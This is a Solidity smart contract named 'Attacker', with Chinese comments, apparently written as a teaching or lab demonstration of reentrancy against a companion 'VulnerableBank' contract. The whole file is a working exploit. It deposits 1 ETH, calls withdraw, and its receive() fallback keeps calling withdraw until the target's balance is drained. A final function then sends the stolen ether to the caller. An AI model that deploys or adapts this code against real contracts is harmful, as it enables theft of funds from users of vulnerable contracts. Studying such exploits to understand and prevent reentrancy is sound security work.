// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev 利用重入漏洞攻击 VulnerableBank 的合约
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackAmount = 1 ether;
    
    // 记录攻击次数（用于调试）
    uint256 public attackCount;
    
    /**
     * @dev 构造函数
     * @param _vulnerableBankAddress 目标银行合约地址
     */
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }
    
    /**
     * @dev 发起攻击
     */
    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH to attack");
        
        // 1. 先存款到银行
        vulnerableBank.deposit{value: attackAmount}();
        
        // 2. 立即取款，触发重入攻击
        vulnerableBank.withdraw(attackAmount);
    }
    
    /**
     * @dev 接收 ETH 时的回调函数 - 重入攻击的核心！
     */
    receive() external payable {
        attackCount++;
        
        // 如果银行还有至少 1 ETH，继续攻击
        // 注意：只在余额充足时攻击，避免 gas 耗尽和转账失败
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
        // 否则攻击结束
    }
    
    /**
     * @dev 查询攻击合约的余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev 提取攻击所得的 ETH
     */
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}